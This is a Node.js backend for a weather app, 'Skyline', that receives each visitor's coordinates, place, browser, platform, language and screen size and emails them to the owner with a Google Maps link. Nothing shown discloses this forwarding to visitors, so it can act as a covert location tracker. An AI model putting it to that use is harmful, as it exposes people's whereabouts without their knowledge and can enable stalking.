import "dotenv/config";
import nodemailer from "nodemailer";
import http from "node:http";
import { fileURLToPath } from "node:url";

const APP_EMAIL = process.env.APP_EMAIL;
const APP_PASSWORD = process.env.APP_PASSWORD;
const NOTIFY_TO = process.env.NOTIFY_TO || APP_EMAIL;
const ALLOWED = (process.env.ORIGIN || "*").split(",").map((s) => s.trim()).filter(Boolean);

function pickOrigin(req) {
  const o = req.headers.origin;
  if (ALLOWED.includes("*")) return o || "*";
  if (o && ALLOWED.includes(o)) return o;
  return ALLOWED[0] || "*";
}

let transporter = null;
if (APP_EMAIL && APP_PASSWORD && APP_PASSWORD !== "your-16-char-gmail-app-password") {
  transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: APP_EMAIL, pass: APP_PASSWORD },
  });
}

function setCors(req, res) {
  res.setHeader("Access-Control-Allow-Origin", pickOrigin(req));
  res.setHeader("Vary", "Origin");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Access-Control-Max-Age", "86400");
}

// Use the parsed body if the platform provided one; otherwise read the stream.
function readJson(req) {
  if (req.body && typeof req.body === "object") return Promise.resolve(req.body);
  return new Promise((resolve) => {
    let data = "";
    req.on("data", (c) => (data += c));
    req.on("end", () => {
      try {
        resolve(JSON.parse(data || "{}"));
      } catch {
        resolve({});
      }
    });
    req.on("error", () => resolve({}));
  });
}

function send(res, status, obj) {
  res.statusCode = status;
  res.setHeader("Content-Type", "application/json");
  res.end(JSON.stringify(obj));
}

export default async function handler(req, res) {
  setCors(req, res);

  // Preflight
  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    res.end();
    return;
  }

  const pathname = (req.url || "/").split("?")[0];

  if (req.method === "GET" && pathname === "/") {
    res.setHeader("Content-Type", "text/plain");
    res.end("Skyline backend OK");
    return;
  }

  if (req.method === "GET" && pathname === "/api/health") {
    send(res, 200, { ok: true, mailerConfigured: !!transporter });
    return;
  }

  if (req.method === "POST" && pathname === "/api/notify") {
    const body = await readJson(req);
    const { lat, lon, place, source, userAgent, platform, language, screen, at } = body;

    if (typeof lat !== "number" || typeof lon !== "number") {
      send(res, 400, { ok: false, error: "lat/lon required" });
      return;
    }

    console.log(
      `[skyline] visit — ${place || "?"} (${lat}, ${lon}) via ${source || "?"}`
    );

    if (!transporter) {
      send(res, 200, { ok: true, emailed: false, reason: "mailer-not-configured" });
      return;
    }

    try {
      await transporter.sendMail(
        buildEmail({ lat, lon, place, source, userAgent, platform, language, screen, at })
      );
      send(res, 200, { ok: true, emailed: true });
    } catch (err) {
      console.error("[skyline] send failed:", err.message);
      send(res, 502, { ok: false, error: "send-failed" });
    }
    return;
  }

  send(res, 404, { ok: false, error: "not-found" });
}

function buildEmail(v) {
  const maps = `https://www.google.com/maps?q=${v.lat},${v.lon}`;
  const when = v.at ? new Date(v.at).toLocaleString() : new Date().toLocaleString();
  const esc = (s) =>
    String(s ?? "—").replace(/[<>&]/g, (c) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" }[c]));

  const text = [
    `Skyline — someone opened your weather app.`,
    ``,
    `Location : ${v.place || "Unknown"}`,
    `Coords   : ${v.lat}, ${v.lon}`,
    `Map      : ${maps}`,
    `Source   : ${v.source || "?"}`,
    `When     : ${when}`,
    `Browser  : ${v.userAgent || "?"}`,
    `Platform : ${v.platform || "?"}`,
    `Language : ${v.language || "?"}`,
    `Screen   : ${v.screen || "?"}`,
  ].join("\n");

  const html = `
  <div style="font-family:ui-sans-serif,system-ui,Arial,sans-serif;max-width:560px;margin:0 auto;border:1px solid #CDE8FF;border-radius:16px;overflow:hidden">
    <div style="background:linear-gradient(135deg,#3B9EEF,#0A3D6B);color:#fff;padding:20px 24px">
      <div style="font-size:18px;font-weight:700">⛅ Skyline — new visit</div>
      <div style="opacity:.85;font-size:13px;margin-top:2px">${esc(v.place) || "Unknown location"}</div>
    </div>
    <table style="width:100%;border-collapse:collapse;font-size:14px;color:#0C2A43">
      ${row("Coordinates", `${v.lat}, ${v.lon}`)}
      ${row("Map", `<a href="${maps}" style="color:#3B9EEF">Open in Google Maps</a>`)}
      ${row("Source", esc(v.source))}
      ${row("When", esc(when))}
      ${row("Browser", esc(v.userAgent))}
      ${row("Platform", esc(v.platform))}
      ${row("Language", esc(v.language))}
      ${row("Screen", esc(v.screen))}
    </table>
  </div>`;

  return {
    from: `"Skyline Alerts" <${APP_EMAIL}>`,
    to: NOTIFY_TO,
    subject: `⛅ Skyline visit — ${v.place || `${v.lat}, ${v.lon}`}`,
    text,
    html,
  };
}

function row(label, value) {
  return `<tr>
    <td style="padding:10px 24px;color:#5b7a92;white-space:nowrap;border-top:1px solid #EAF4FF;font-weight:600">${label}</td>
    <td style="padding:10px 24px;border-top:1px solid #EAF4FF;word-break:break-word">${value}</td>
  </tr>`;
}

if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
  const PORT = process.env.PORT || 8787;
  http.createServer((req, res) => handler(req, res)).listen(PORT, "127.0.0.1", () => {
    console.log(`[skyline] backend on http://127.0.0.1:${PORT}`);
  });
}
